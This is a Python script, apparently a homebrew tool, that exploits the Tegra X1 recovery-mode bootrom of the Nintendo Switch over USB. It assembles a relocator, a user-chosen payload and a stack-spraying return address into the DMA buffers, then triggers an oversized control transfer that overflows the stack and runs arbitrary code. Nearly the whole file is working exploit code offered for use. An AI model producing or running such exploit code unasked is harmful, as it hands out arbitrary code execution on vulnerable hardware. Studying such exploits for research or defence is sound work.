import os
import usb

# PID and VID of a Tegra X1 Nintendo Switch. Needed to establish a USB connection
SWITCH_VID = 0x0955
SWITCH_PID = 0x7321

# The maximum size of a payload to be uploaded to the switch
MAX_LENGTH = 0x30298

# The memory address where the stack ends
END_OF_STACK = 0x40010000

# The address where the RCM payload is placed.
RCM_PAYLOAD_ADDR = 0x40010000
# The address where the user payload is expected to begin (after the intermizzo.bin instructions)
PAYLOAD_START_ADDR = 0x40010E40

# Specify the range of addresses where we should inject octpayload address.
RUNTIME_STACK_START = 0x40014E40
RUNTIME_STACK_END = 0x40017000

# DMA Buffer Addresses where responses are stored
COPY_BUFFER_ADDRESSES = [0x40005000, 0x40009000]

def find_device():
    # https://devicehunt.com/view/type/usb/vendor/0955 to find vid pid
    # Switch vid = 0x0955, pid = 0x7321
    switch = usb.core.find(idVendor=SWITCH_VID, idProduct=SWITCH_PID)
    if switch:
        print("Device found!")
        return switch
    else:
        print("Looking for device...")


def find_payload():
    print("Enter the number of the payload you would like to run: ")
    files = []
    counter = 1
    for filename in os.listdir('./payloads'):
        file_path = os.path.join('./payloads', filename)
        if os.path.isfile(file_path):
            files.append(filename)
            print(f'{counter}: {filename}')
            counter += 1
    while True:
        index = input("-----\n")
        if index.isdigit() and 0 <= int(index) - 1< len(files):
            return files[int(index) - 1]
        else:
            print('Invalid index, please try again')


def generate_payload(payload_name):
    # Creates the payload object with length as the first argument and 680 bytes of padding
    # This tells the switch how large the payload it recieves will be
    payload = MAX_LENGTH.to_bytes(4, byteorder='little')
    payload += b'\0' * (680 - len(payload))

    # This file contains machine code to relocate the payload if it is sent to a higher memory address than expected
    with open('intermezzo.bin', "rb") as f:
        intermezzo = f.read()
        payload += intermezzo
    padding_size = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + len(intermezzo))
    payload += (b'\0' * padding_size)

    # Read the user payload into memory.
    with open(f'./payloads/{payload_name}', "rb") as f:
        target_payload = f.read()

    # Fit 0x4000 bytes of the payload before the runtime stack
    padding_size = RUNTIME_STACK_START - PAYLOAD_START_ADDR
    payload += target_payload[:padding_size]

    # Copy the return address that we want onto the entire stack
    repeat_count = int((RUNTIME_STACK_END - RUNTIME_STACK_START) / 4)
    payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)

    # Then, when the stack ends, place the remainder of the payload.
    payload += target_payload[padding_size:]

    # Pad the payload to fill a USB request exactly, so we don't send a short
    # packet and break out of the RCM loop.
    payload_length = len(payload)
    padding_size = 0x1000 - (payload_length % 0x1000)
    payload += (b'\0' * padding_size)
    return payload


def write_to_switch(switch, payload):
    payload_length = len(payload)
    # We must transfer the data 0x1000 bytes at a time
    transfer_size = 0x1000
    buffer = 0
    while payload_length:
        end = min(payload_length, transfer_size)
        payload_length -= end

        chunk = payload[:end]
        payload = payload[end:]
        buffer = 1 - buffer
        switch.write(0x01, chunk, 1000)
    # Since there are 2 DMA buffers and we want to make sure we are writing to the lower one,
    # we ensure that the buffer address is correct by writing empty data
    if COPY_BUFFER_ADDRESSES[buffer] != COPY_BUFFER_ADDRESSES[1]:
        buffer = 1 - buffer
        switch.write(0x01, b'\0' * 0x1000, 1000)
    return buffer


if __name__ == "__main__":
    my_payload_name = find_payload()
    switch = find_device()
    device_id = switch.read(0x81, 16, 1000)
    print(f'SwitchID : {device_id}')

    # Generate the payload
    payload = generate_payload(my_payload_name)

    if len(payload) > MAX_LENGTH:
        size_over = len(payload) - MAX_LENGTH
        raise OverflowError(f"ERROR: Payload is too large to be submitted via RCM. ({size_over} bytes larger than max).")

    # Write the payload
    final_buffer = write_to_switch(switch, payload)

    # Trigger the response code, thus smashing the stack
    print("Smashing the stack...")
    try:
        length = END_OF_STACK - COPY_BUFFER_ADDRESSES[final_buffer]
        switch.ctrl_transfer(0x82, 0x0, 0, 0, length)
    except ValueError as e:
        print(str(e))
    except IOError:
        print("\nSuccessfully smashed the stack! Welcome to your own custom Nintendo Switch :)\n")
